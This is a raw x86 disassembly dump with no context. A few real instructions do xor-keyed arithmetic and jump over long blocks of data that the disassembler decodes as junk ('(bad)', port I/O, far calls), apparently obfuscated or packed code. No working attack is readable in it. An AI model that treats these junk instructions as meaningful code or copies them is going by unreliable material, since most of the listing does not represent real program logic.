  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	jmp    0x780c:0x8ec5314
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x402879
  40288e:	mov    ah,0xd3
  402890:	(bad)  
  402891:	nop
  402892:	call   0x969e:0x9d0444a1
  402899:	iret   
  40289a:	(bad)  
  40289c:	pusha  
  40289d:	hlt    
  40289e:	addr16 add eax,0xbd1e1fee
  4028a4:	ja     0x4028fc
  4028a6:	pop    ds
  4028a7:	pop    ebp
  4028a8:	call   DWORD PTR [edx+0x75]
  4028ab:	idiv   BYTE PTR [eax-0x37]
  4028ae:	pop    esi
  4028af:	pop    ebp
  4028b0:	fist   DWORD PTR [eax-0x7cb4a7be]
  4028b6:	inc    ebx
  4028b7:	mov    edi,0x10fbc6e9
  4028bc:	int    0x8a
  4028be:	push   0x47
  4028c0:	mov    bh,BYTE PTR [eax+0x406a1648]
  4028c6:	push   cs
  4028c7:	test   DWORD PTR [edx+0x2a],eax
  4028ca:	je     0x4028c9
  4028cc:	mov    al,ds:0x7c383bd3
  4028d1:	dec    esp
  4028d2:	or     esi,esi
  4028d4:	out    dx,eax
  4028d5:	sbb    al,0xe3
  4028d7:	xlat   BYTE PTR ds:[ebx]
  4028d8:	mov    al,0x41
  4028da:	cmp    dh,BYTE PTR ds:0x82d4
  4028df:	jns    0x402937
  4028e1:	jns    0x402875
  4028e3:	xor    edi,esp
  4028e5:	cmp    DWORD PTR ds:0x20780303,ebx
  4028eb:	adc    bl,al
  4028ed:	(bad)  
  4028ef:	(bad)  
  4028f0:	push   edx
  4028f1:	shr    BYTE PTR [eax],cl
  4028f3:	jb     0x4028db
  4028f5:	pop    es
  4028f6:	or     eax,ecx
  4028f8:	pushf  
  4028f9:	in     eax,dx
  4028fa:	stos   BYTE PTR es:[edi],al
  4028fb:	fcmove st,st(6)
  4028fd:	fst    DWORD PTR [ebp+0x63]
  402900:	outs   dx,BYTE PTR ds:[esi]
  402901:	sahf   
  402902:	ror    DWORD PTR [edi+ebp*1+0x1fe2a398],cl
  402909:	ret    0xc7e7
  40290c:	popf   
  40290d:	mov    eax,ds:0xd8d4221f
  402912:	push   edx
  402913:	jne    0x40295f
  402915:	adc    esi,ecx
  402917:	dec    edx
  402918:	adc    al,0xac
  40291a:	outs   dx,BYTE PTR ds:[esi]
  40291b:	adc    cl,BYTE PTR [ecx+edx*4]
  40291e:	cld    
  40291f:	js     0x4028a8
  402921:	fs out 0x20,al
  402924:	cli    
  402925:	jne    0x4028dc
  402927:	jl     0x402980
  402929:	adc    al,0x9a
  40292b:	leave  
  40292c:	push   edx
  40292d:	dec    esp
  40292e:	sar    BYTE PTR [edx],0x70
  402931:	bound  ebx,QWORD PTR [ecx]
  402933:	in     al,dx
  402934:	shl    BYTE PTR [eax-0x22121c2b],cl
  40293a:	sti    
  40293b:	(bad)  
  40293d:	push   ecx
  40293e:	xchg   ebp,eax
  40293f:	iret   
  402940:	in     al,0xfd
  402942:	inc    ecx
  402943:	div    dl
  402945:	ror    dh,0xa6
  402948:	out    0x18,al
  40294a:	sub    BYTE PTR [esp+eiz*2],0xf7
  40294e:	pop    ss
  40294f:	mov    esi,0xe71eac50
  402954:	ror    al,cl
  402956:	pop    esi
  402957:	mov    bh,0x6b
  402959:	and    ebp,DWORD PTR [ebp-0x63]
  40295c:	sub    esi,edi
  40295e:	xchg   edi,eax
  40295f:	push   edx
  402960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402961:	mov    ecx,0xae86d2fb
  402966:	or     eax,esi
  402968:	xchg   esi,eax
  402969:	imul   ebp,edx,0xffffffbe
  40296c:	fcmovne st,st(2)
  40296e:	mov    ebx,0xab712b65
  402973:	adc    DWORD PTR [ebx],0xffffff9e
  402976:	jnp    0x402995
  402978:	daa    
  402979:	ja     0x4029c8
  40297b:	stc    
  40297c:	shl    DWORD PTR [ebx],cl
  40297e:	(bad)  
  40297f:	mov    edi,0x83b17aed
  402984:	mov    bh,0x13
  402986:	adc    edx,DWORD PTR [ecx+0x1480168e]
  40298c:	cwde   
  40298d:	xor    al,0x74
  40298f:	inc    edx
  402990:	int3   
  402991:	inc    esi
  402993:	or     al,0x37
  402995:	inc    eax
  402996:	mov    dh,0xb5
  402998:	mov    al,0x64
  40299a:	jbe    0x402a0c
  40299c:	mov    ebx,esp
  40299e:	cmp    BYTE PTR [esi+eax*4],al
  4029a1:	lods   al,BYTE PTR ds:[esi]
  4029a2:	sub    ch,BYTE PTR [eax]
  4029a4:	(bad)  
  4029a5:	fimul  WORD PTR [ebp+0x0]
  4029a8:	cdq    
  4029a9:	dec    esp
  4029aa:	cwde   
  4029ab:	cmp    eax,0xbaab291b
  4029b0:	sbb    ebp,eax
  4029b2:	inc    ebp
  4029b3:	push   0xdcefc141
  4029b8:	mov    es,WORD PTR [ecx+edi*8]
  4029bb:	inc    ecx
  4029bc:	cs mov eax,0xcbd724da
  4029c2:	xor    eax,0x2dd0b6db
  4029c7:	jp     0x402961
  4029c9:	inc    ebx
  4029ca:	mov    ebx,0x3d238e65
  4029cf:	mov    esi,0x78937bc5
  4029d4:	add    al,BYTE PTR [ebx+0x562f4d52]
  4029da:	jns    0x402973
  4029dc:	test   eax,0xa400633f
  4029e1:	mov    eax,0xa1fab5f5
  4029e6:	and    eax,0xee86dce5
  4029eb:	fidiv  WORD PTR [esi]
  4029ed:	or     esp,DWORD PTR [ecx]
  4029ef:	add    DWORD PTR [eax],0x1e
  4029f2:	pop    es
  4029f3:	ret    0xb163
  4029f6:	push   esp
  4029f7:	cmp    BYTE PTR ds:0x2fe124b4,ah
  4029fd:	iret   
  4029fe:	sbb    al,0x70
  402a00:	rcr    DWORD PTR [ebp-0x3c],1
  402a03:	out    dx,eax
  402a04:	pop    edi
  402a05:	mov    ecx,0x91b4073f
  402a0a:	adc    BYTE PTR [eax-0x52b0242e],dh
  402a10:	imul   DWORD PTR ss:[ebx+0x6450df50]
  402a17:	or     ch,bl
  402a19:	pop    es
  402a1a:	or     ah,dl
  402a1c:	fidivr WORD PTR [esi]
  402a1e:	cli    
  402a1f:	mov    bl,BYTE PTR [edx+eiz*4-0x52d55d3c]
  402a26:	shl    BYTE PTR [eax],cl
  402a28:	and    BYTE PTR [edx-0x54],cl
  402a2b:	pop    ss
  402a2c:	call   0xb88cfff9
  402a31:	add    ecx,DWORD PTR [ebp+0x4f819a82]
  402a37:	jge    0x402a3a
  402a39:	and    eax,0xc0dd9e9a
  402a3e:	add    DWORD PTR [eax],esp
  402a40:	(bad)  
  402a41:	pop    eax
  402a42:	push   ss
  402a43:	out    dx,al
  402a44:	mov    edi,cs
  402a46:	pusha  
  402a47:	mov    cl,0xe0
  402a49:	jg     0x402aa9
  402a4b:	icebp  
  402a4c:	mov    dh,0xb8
  402a4e:	push   edi
  402a4f:	sub    eax,DWORD PTR [edx-0x6c]
  402a52:	jle    0x4029d7
  402a54:	pushf  
  402a55:	into   
  402a56:	add    DWORD PTR [ebx+0x4],0x5b659f2f
  402a5d:	outs   dx,DWORD PTR ds:[esi]
  402a5e:	push   0xffffff86
  402a60:	enter  0x8a05,0x9c
  402a64:	(bad)  
  402a65:	jne    0x402a42
  402a67:	ret    
  402a68:	retf   
  402a69:	mov    BYTE PTR [esi-0x40],cl
  402a6c:	cmp    ah,BYTE PTR [ebp+0x4e70f12e]
  402a72:	fistp  QWORD PTR [esi]
  402a74:	mov    al,BYTE PTR [edx+0x4e]
  402a77:	jae    0x402aaf
  402a79:	pop    edx
  402a7a:	sub    ebp,esp
  402a7c:	mov    ebp,DWORD PTR [edi]
  402a7e:	cmp    esp,DWORD PTR [eax]
  402a80:	sub    ecx,DWORD PTR [ebx]
  402a82:	and    al,0x11
  402a84:	cs adc eax,0xa1be244e
  402a8a:	leave  
  402a8b:	inc    edi
  402a8c:	div    BYTE PTR [ebp+0x4cb10c74]
  402a92:	jp     0x402a4a
  402a94:	or     eax,0xe82c59e1
  402a99:	nop
  402a9a:	adc    ecx,ebp
  402a9c:	xor    edx,ebx
  402a9e:	stos   BYTE PTR es:[edi],al
  402a9f:	dec    esp
  402aa0:	sub    eax,0x48b8e880
  402aa5:	sbb    cl,BYTE PTR [ebp+0x528b8bf0]
  402aab:	cmp    DWORD PTR [edx+0x39490d35],eax
  402ab1:	mov    eax,0xbe0dbd97
  402ab6:	neg    edi
  402ab8:	dec    edx
  402ab9:	mov    dl,0xa9
  402abb:	cdq    
  402abc:	popf   
  402abd:	mov    bh,0xa7
  402abf:	lock push ss
  402ac1:	fistp  QWORD PTR [ecx]
  402ac3:	pop    es
  402ac4:	addr16 mov dh,0xd2
  402ac7:	xchg   ebp,eax
  402ac8:	icebp  
  402ac9:	dec    ecx
  402aca:	add    ch,0x17
  402acd:	rcr    BYTE PTR [eax],0xbd
  402ad0:	jmp    0x615e1579
  402ad5:	sub    eax,0x6c99a9f5
  402ada:	(bad)  
  402adc:	lods   eax,DWORD PTR ds:[esi]
  402add:	adc    al,0xfa
  402adf:	std    
  402ae0:	outs   dx,BYTE PTR ds:[esi]
  402ae1:	or     al,0x17
  402ae3:	jae    0x402ac7
  402ae5:	mov    eax,ds:0xf924b5c6
  402aea:	pop    ecx
  402aeb:	sub    dh,BYTE PTR [edx-0x4c]
  402aee:	cwde   
  402aef:	std    
  402af0:	das    
  402af1:	sub    BYTE PTR [eax],cl
  402af3:	loope  0x402afb
  402af5:	jp     0x402b4b
  402af7:	and    dl,al
  402af9:	cli    
  402afa:	repnz in eax,dx
  402afc:	jmp    0xa672:0x23dccf9
  402b03:	loopne 0x402aa4
  402b05:	mov    ch,0x3c
  402b07:	imul   DWORD PTR [eax-0x2e]
  402b0a:	fwait
  402b0b:	push   esi
  402b0c:	add    ebx,DWORD PTR [eax+edx*1]
  402b0f:	sub    ecx,eax
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	mov    edi,0x8e53f3ce
  402b27:	adc    bh,BYTE PTR [eax+0x78]
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402acb
  402b2f:	add    edi,DWORD PTR [bx]
  402b32:	jnp    0x402b63
  402b34:	sbb    edi,DWORD PTR [eax+ebx*2+0x47]
  402b38:	mov    al,0xe9
  402b3a:	fistp  WORD PTR [edi-0x5f]
  402b3d:	(bad)  
  402b3e:	jle    0x402af5
  402b40:	jnp    0x402b2a
  402b42:	popf   
  402b43:	pop    ecx
  402b44:	out    dx,al
  402b45:	xchg   DWORD PTR [ecx-0x34],ebp
  402b48:	(bad)  
  402b49:	shl    BYTE PTR [edx-0x43a9271f],0x32
  402b50:	fidiv  DWORD PTR [eax+eax*8+0x5311b545]
  402b57:	je     0x402bb4
  402b59:	loop   0x402b43
  402b5b:	in     eax,0x83
  402b5d:	push   edx
  402b5e:	add    edi,DWORD PTR [eax]
  402b60:	loop   0x402b29
  402b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b63:	test   DWORD PTR [edi-0x71d0de27],esp
  402b69:	push   ds
  402b6a:	sbb    al,0xb7
  402b6c:	daa    
  402b6d:	jne    0x402ba3
  402b6f:	imul   edi,DWORD PTR [edi+ebx*2-0x49],0x38
  402b74:	test   al,0x30
  402b76:	lods   al,BYTE PTR ds:[esi]
  402b77:	sbb    BYTE PTR [ebx-0x59909c92],ch
  402b7d:	repz push ecx
  402b7f:	push   ecx
  402b80:	cmp    ebp,DWORD PTR [edi]
  402b82:	not    BYTE PTR [ecx]
  402b84:	jb     0x402bdd
  402b86:	jns    0x402b6f
  402b88:	cwde   
  402b89:	mov    bx,0x59df
  402b8d:	add    BYTE PTR [ebp-0x52c9258f],bl
  402b93:	clc    
  402b94:	push   ss
  402b95:	jbe    0x402bf0
  402b97:	je     0x402b9a
  402b99:	and    al,0xf8
  402b9b:	js     0x402bdf
  402b9d:	ret    
  402b9e:	sahf   
  402b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ba0:	jne    0x402b3e
  402ba2:	mov    ch,BYTE PTR [esi+ecx*2+0x56060a39]
  402ba9:	aaa    
  402baa:	ror    DWORD PTR [ecx],0xf8
  402bad:	adc    esi,edx
  402baf:	popf   
  402bb0:	ror    bl,cl
  402bb2:	cmp    DWORD PTR [edi],0xb1686e8b
  402bb8:	iret   
  402bb9:	mov    al,ds:0x37cb6357
  402bbe:	popf   
  402bbf:	ja     0x402b6a
  402bc1:	addr16 mov ebx,eax
  402bc4:	ret    0xcbd4
  402bc7:	mov    cl,BYTE PTR [ebx-0x55e16051]
  402bcd:	fldcw  WORD PTR [ebx+0x1bebe0b1]
  402bd3:	xor    DWORD PTR [ecx-0x515ee155],edx
  402bd9:	xor    eax,0x8d39edbc
  402bde:	pop    ecx
  402bdf:	adc    al,bl
  402be1:	push   ss
  402be2:	push   esp
  402be3:	scas   eax,DWORD PTR es:[edi]
  402be4:	shr    BYTE PTR [edi],1
  402be6:	inc    ebp
  402be7:	fnsave [edi+0x6288db67]
  402bed:	push   es
  402bee:	(bad)  
  402bef:	sbb    bl,BYTE PTR [edx+0x6c7868c8]
  402bf5:	retf   0x9fa1
  402bf8:	fadd   st(1),st
  402bfb:	push   ss
  402bfc:	mov    ah,0x62
  402bfe:	sahf   
  402bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c00:	jle    0x402c4a
  402c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c03:	arpl   WORD PTR [esi+0x707eaa47],bx
  402c09:	aaa    
  402c0a:	loop   0x402c09
  402c0c:	xor    BYTE PTR [eax-0x7623fc92],cl
  402c12:	fldlg2 
  402c14:	imul   esi,edx,0xe028c4aa
  402c1a:	ret    0xe09
  402c1d:	fild   QWORD PTR [edx]
  402c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c20:	or     ebx,DWORD PTR [esi]
  402c22:	xchg   esi,eax
  402c23:	dec    ecx
  402c24:	(bad)  
  402c25:	sbb    eax,0x9b002e4
  402c2a:	std    
  402c2b:	ret    0x473a
  402c2e:	mov    bl,0x3a
  402c30:	leave  
  402c31:	pop    ds
  402c32:	(bad)  
  402c33:	mov    eax,ds:0x5186f505
  402c38:	push   ecx
  402c39:	adc    esp,0xd279a755
  402c3f:	jge    0x402c9e
  402c41:	inc    ebx
  402c42:	ds out 0x2e,eax
  402c45:	mov    esi,0xa92533d6
  402c4a:	add    ah,BYTE PTR [ecx-0x3355c21c]
  402c50:	dec    esp
  402c51:	inc    ch
  402c53:	lahf   
  402c54:	scas   al,BYTE PTR es:[edi]
  402c55:	lds    eax,FWORD PTR [esi+0x665dffd]
  402c5b:	sub    BYTE PTR [edi-0x15],0x64
  402c5f:	ins    BYTE PTR es:[edi],dx
  402c60:	call   0xd678:0x2bdab729
  402c67:	loopne 0x402bfb
  402c69:	push   ebp
  402c6a:	mov    DWORD PTR [eax-0x2e],eax
  402c6d:	cmp    ch,BYTE PTR [edi-0x68abb520]
  402c73:	adc    eax,0x63cf039
  402c78:	les    esi,FWORD PTR [ebx-0x1d9ed33]
  402c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c7f:	icebp  
  402c80:	jnp    0x402c6a
  402c82:	xchg   DWORD PTR [edx+0x22eec295],ebx
  402c88:	xchg   ecx,eax
  402c89:	leave  
  402c8a:	pop    ebp
  402c8b:	leave  
  402c8c:	xor    esi,DWORD PTR [ecx+edx*8]
  402c8f:	aam    0x6b
  402c91:	xor    dh,BYTE PTR [edi+0x67]
  402c94:	(bad)  
  402c95:	outs   dx,BYTE PTR ds:[esi]
  402c96:	inc    eax
  402c97:	in     al,0xf2
  402c99:	retf   0x177a
  402c9c:	sahf   
  402c9d:	xor    eax,esp
  402c9f:	jecxz  0x402cc5
  402ca1:	(bad)
  402ca4:	push   0x2d
  402ca6:	pop    ds
  402ca7:	sbb    eax,0x29f2c742
  402cac:	mov    al,ds:0x3ca59594
  402cb1:	mov    eax,0xf4078138
  402cb6:	xchg   BYTE PTR [ecx+ebp*4+0x43d24a9f],ch
  402cbd:	xor    DWORD PTR [di+0x2c],ebp
  402cc1:	xchg   bh,bh
  402cc3:	ss test al,0xf6
  402cc6:	or     al,0xc8
  402cc8:	pop    edx
  402cc9:	pop    esi
  402cca:	sub    eax,0xbf49d428
  402ccf:	repnz repz in eax,dx
  402cd2:	mov    esp,DWORD PTR [ecx]
  402cd4:	dec    ebp
  402cd5:	xor    cl,BYTE PTR [edi+0x1e]
  402cd8:	dec    ebp
  402cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cda:	popf   
  402cdb:	lods   eax,DWORD PTR ds:[esi]
  402cdc:	jns    0x402d4a
  402cde:	bound  ecx,QWORD PTR [ecx+0x7ae8416a]
  402ce4:	jbe    0x402cb3
  402ce6:	mov    cl,0x29
  402ce8:	pop    esi
  402ce9:	pusha  
  402cea:	push   es
  402ceb:	fninit 
  402ced:	pop    ecx
  402cee:	lds    edx,FWORD PTR [esi+esi*1-0x11]
  402cf2:	shl    cl,0xf0
  402cf5:	fadd   DWORD PTR [edi-0x3a55d30d]
  402cfb:	iret   
  402cfc:	mov    al,ds:0xa53c7276
  402d01:	leave  
  402d02:	push   0xe472ef4b
  402d07:	cwde   
  402d08:	adc    eax,0xceff880a
  402d0d:	mov    BYTE PTR [eax-0x58],ch
  402d10:	adc    eax,0x9a9e748c
  402d15:	xor    eax,0x2e0820de
  402d1a:	fwait
  402d1b:	and    ebp,eax
  402d1d:	sub    BYTE PTR [ebx],bh
  402d1f:	stos   DWORD PTR es:[edi],eax
  402d20:	data16 jne 0x402d63
  402d23:	dec    BYTE PTR [edi+0x73]
  402d26:	icebp  
  402d27:	pop    esi
  402d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d29:	push   ds
  402d2a:	lods   al,BYTE PTR gs:[esi]
  402d2c:	inc    esi
  402d2d:	arpl   WORD PTR [ebp+0x2ee00de7],cx
  402d33:	pop    ds
  402d34:	pop    ds
  402d35:	add    bl,BYTE PTR [ecx+0x1c]
  402d38:	sti    
  402d39:	or     bh,ah
  402d3b:	and    eax,0x7bc5149
  402d40:	imul   ebp,ebx,0xe5715097
  402d46:	fst    DWORD PTR [ecx-0xf302dcc]
  402d4c:	jle    0x402daa
  402d4e:	push   ds
  402d4f:	shl    DWORD PTR [esi-0x4f0da263],0x7
  402d56:	mov    ch,0x5e
  402d58:	xor    DWORD PTR ds:0xc100ceb5,ecx
  402d5e:	push   ebx
  402d5f:	mov    dl,0xf4
  402d61:	pop    es
  402d62:	cmp    BYTE PTR [ebx+0x75eb2e73],al
  402d68:	fild   QWORD PTR [ecx+0x26]
  402d6b:	ds jmp 0x80b7:0xdb61ed66
  402d73:	ja     0x402d51
  402d75:	push   ebx
  402d76:	mov    edi,0x6e5d0695
  402d7b:	js     0x402d24
  402d7d:	ss repnz retf 
  402d80:	sbb    BYTE PTR [esi+0x4ebdbd60],al
  402d86:	push   esi
  402d87:	xchg   esp,eax
  402d88:	jno    0x402d7b
  402d8a:	out    0x88,eax
  402d8c:	ja     0x402d34
  402d8e:	inc    esp
  402d8f:	push   cs
  402d90:	xchg   BYTE PTR [edx-0x2873d1e5],bh
  402d96:	jae    0x402e01
  402d98:	call   0x16b0:0xb00e3d93
  402d9f:	fidivr DWORD PTR [ebp-0x52]
  402da2:	mov    ah,0x8a
  402da4:	(bad)  
  402da5:	in     eax,0xde
  402da7:	jno    0x402d9d
  402da9:	mov    dh,0x83
  402dab:	mov    esi,DWORD PTR [ecx+0x7a]
  402dae:	push   cs
  402daf:	fs sub ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	dec    ebp
  402df3:	test   al,0x23
  402df5:	mov    dh,0xc
  402df7:	pop    ss
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e76
  402dff:	shr    DWORD PTR [esi],0x8a
  402e02:	mov    eax,ds:0xcc0979a6
  402e07:	xor    BYTE PTR [edx-0x5fa40a51],0x5d
  402e0e:	pop    ss
  402e0f:	enter  0x7ec0,0x32
  402e13:	aas    
  402e14:	(bad)  
  402e15:	jmp    0x402deb
  402e17:	imul   ecx,DWORD PTR [ebp+0x51],0xffffffd4
  402e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e1c:	and    DWORD PTR [ebp+0x5b9aa600],edx
  402e22:	jbe    0x402e1f
  402e24:	jno    0x402db5
  402e26:	int    0xa2
  402e28:	and    DWORD PTR [ecx],0x50812ca1
  402e2e:	xchg   ecx,eax
  402e2f:	jecxz  0x402e11
  402e31:	rcl    DWORD PTR [esi-0x7e906881],cl
  402e37:	jne    0x402e3a
  402e39:	outs   dx,BYTE PTR ds:[esi]
  402e3a:	mov    edi,0xf6107f84
  402e3f:	add    al,0x0
  402e41:	mov    eax,ds:0xdd99d1a2
  402e46:	scas   al,BYTE PTR es:[edi]
  402e47:	int    0x47
  402e49:	inc    esi
  402e4a:	dec    esi
  402e4b:	pop    ecx
  402e4c:	xchg   ebp,eax
  402e4d:	int    0xff
  402e4f:	es enter 0x5ea4,0xa3
  402e54:	dec    esi
  402e55:	ins    DWORD PTR es:[edi],dx
  402e56:	fdivr  st(3),st
  402e58:	pop    edi
  402e59:	jle    0x402e8f
  402e5b:	sub    dl,0x79
  402e5e:	adc    BYTE PTR [ecx+esi*1-0x6a46d109],cl
  402e65:	retf   0x718
  402e68:	scas   eax,DWORD PTR es:[edi]
  402e69:	xchg   ebp,eax
  402e6a:	imul   eax,DWORD PTR [edi-0x72a0ee09],0xffffffe4
  402e71:	push   es
  402e72:	nop
  402e73:	scas   eax,DWORD PTR es:[edi]
  402e74:	test   BYTE PTR [edi+0x727af730],bl
  402e7a:	ss jne 0x402e29
  402e7d:	in     eax,0xeb
  402e7f:	cs std 
  402e81:	mov    ah,0xe8
  402e83:	inc    BYTE PTR [edx-0x46]
  402e86:	aas    
  402e87:	ds push cs
  402e89:	dec    ecx
  402e8a:	lock push 0x23
  402e8d:	scas   eax,DWORD PTR es:[edi]
  402e8e:	ins    DWORD PTR es:[edi],dx
  402e8f:	dec    esp
  402e90:	(bad)  
  402e91:	xor    esi,esi
  402e93:	sbb    al,BYTE PTR [edx-0x27]
  402e96:	in     al,dx
  402e97:	inc    edx
  402e98:	adc    al,0x21
  402e9a:	inc    DWORD PTR [ebp-0x3a0b9ec3]
  402ea0:	and    DWORD PTR [eax-0x4dd6e50b],edi
  402ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea7:	mov    ds:0xac1daaf,eax
  402eac:	xchg   ebp,eax
  402ead:	push   DWORD PTR [esi]
  402eaf:	test   DWORD PTR [eax+0x35],esi
  402eb2:	sbb    al,0xcb
  402eb4:	shr    BYTE PTR [edx-0x740e7d29],1
  402eba:	ja     0x402ef7
  402ebc:	mov    ecx,0xd0d8970b
  402ec1:	ret    
  402ec2:	mov    dl,0xac
  402ec4:	jge    0x402ec0
  402ec6:	cmp    al,0xd1
  402ec8:	jbe    0x402e9a
  402eca:	(bad)  
  402ecb:	stos   DWORD PTR es:[edi],eax
  402ecc:	in     al,dx
  402ecd:	out    dx,al
  402ece:	imul   edx,DWORD PTR [ebx+ebx*2-0x9],0x476c672e
  402ed6:	xchg   ebp,ecx
  402ed8:	push   ebp
  402ed9:	and    eax,0xc69c7d9
  402ede:	leave  
  402edf:	stc    
  402ee0:	fcmove st,st(3)
  402ee2:	bound  eax,QWORD PTR [edi-0x43ff53ae]
  402ee8:	fs (bad) 
  402eeb:	push   edx
  402eec:	frstor ds:[edi+eax*1-0x2bfeb703]
  402ef4:	inc    ebx
  402ef5:	and    bh,0xbf
  402ef8:	pop    es
  402ef9:	(bad)  
  402efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402efb:	or     BYTE PTR [ecx],cl
  402efd:	add    esp,DWORD PTR [esi]
  402eff:	mov    esp,0xf3ac0474
  402f04:	std    
  402f05:	out    dx,eax
  402f06:	mov    ch,0x7e
  402f08:	cld    
  402f09:	push   es
  402f0a:	push   0x8ccda3f4
  402f0f:	ds cmp al,0x8
  402f12:	sbb    DWORD PTR ds:0x28eab52f,0x2d
  402f19:	push   ss
  402f1a:	imul   BYTE PTR [edi]
  402f1c:	and    eax,0x3c05b36a
  402f21:	shl    DWORD PTR [edi+0x1c399d14],cl
  402f27:	sbb    al,0xd7
  402f29:	retf   0xca61
  402f2c:	fidivr DWORD PTR [eax-0x55d6b4c6]
  402f32:	sub    ebp,DWORD PTR [ecx-0x8]
  402f35:	add    al,0xa3
  402f37:	adc    al,0xab
  402f39:	imul   BYTE PTR [eax+0x3c]
  402f3c:	pop    edi
  402f3d:	inc    esp
  402f3e:	stos   BYTE PTR es:[edi],al
  402f3f:	shr    DWORD PTR [ecx+0x67e95fd7],0xde
  402f46:	jmp    0x80b89a5f
  402f4b:	stos   DWORD PTR es:[edi],eax
  402f4c:	ja     0x402ef3
  402f4e:	sbb    bl,BYTE PTR [eax+0x1]
  402f51:	sub    eax,0xb7f31a0b
  402f56:	cmp    bh,ah
  402f58:	mov    cl,0x81
  402f5a:	mov    ebp,0xe645abdb
  402f5f:	or     DWORD PTR [edx],esp
  402f61:	fdivr  st(4),st
  402f63:	aad    0x6
  402f65:	lods   eax,DWORD PTR ds:[esi]
  402f66:	pop    edx
  402f67:	add    ecx,DWORD PTR [eax-0x3]
  402f6a:	mov    ebx,DWORD PTR [ecx]
  402f6c:	xchg   DWORD PTR [esi],esp
  402f6e:	retf   
  402f6f:	cld    
  402f70:	stc    
  402f71:	cmp    edx,DWORD PTR [ebx-0x58772222]
  402f77:	cwde   
  402f78:	dec    edi
  402f79:	test   eax,0xf4c4b808
  402f7e:	mov    ss,WORD PTR [edx+0x282c6a88]
  402f84:	jecxz  0x402fd0
  402f86:	into   
  402f87:	test   BYTE PTR [ecx],0x17
  402f8a:	cli    
  402f8b:	in     al,0x3d
  402f8d:	ror    BYTE PTR [ebx-0x2c],1
  402f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f91:	and    bl,BYTE PTR [ebx+ebx*1+0x1]
  402f95:	dec    esi
  402f96:	sub    BYTE PTR [ecx],ch
  402f98:	(bad)  
  402f99:	mov    WORD PTR [ebp-0x2337831],es
  402f9f:	test   DWORD PTR [esi+ebp*1+0x1a86513f],edx
  402fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fa7:	hlt    
  402fa8:	fcmovbe st,st(6)
  402faa:	mov    bh,0x84
  402fac:	mov    edi,0x24bb84cc
  402fb1:	out    0xe8,eax
  402fb3:	inc    esi
  402fb4:	arpl   WORD PTR [edi+eax*1],cx
  402fb7:	fwait
  402fb8:	ret    
  402fb9:	cld    
  402fba:	jns    0x402fd5
  402fbc:	mov    esp,DWORD PTR [esi+eax*1]
  402fbf:	sbb    esi,DWORD PTR [ebx+0x23309c19]
  402fc5:	fdiv   st(6),st
  402fc7:	lahf   
  402fc8:	dec    edx
  402fc9:	rol    ebp,0x34
  402fcc:	pop    ecx
  402fcd:	les    esp,FWORD PTR [edi]
  402fcf:	retf   0x827a
  402fd2:	xor    eax,0xc04010d6
  402fd7:	jo     0x40303c
  402fd9:	sub    eax,0xc57fc81c
  402fde:	iret   
  402fdf:	adc    eax,0xca8541ca
  402fe4:	into   
  402fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe6:	es pop ss
  402fe8:	ins    BYTE PTR es:[edi],dx
  402fe9:	leave  
  402fea:	mov    eax,0x9d380082
  402fef:	add    al,al
  402ff1:	or     BYTE PTR cs:[edx+0x44267238],dl
  402ff8:	mov    ds:0xbccee3ab,al
  402ffd:	mov    dl,0xe9
  402fff:	call   0xd70e:0x339d12c9
  403006:	mov    ebx,0x78ed496d
  40300b:	out    dx,al
  40300c:	push   ds
  40300d:	xchg   ebp,eax
  40300e:	sub    eax,0xa54ab497
  403013:	mov    dl,0xa4
  403015:	mov    ecx,ebp
  403017:	(bad)  
  403018:	dec    eax
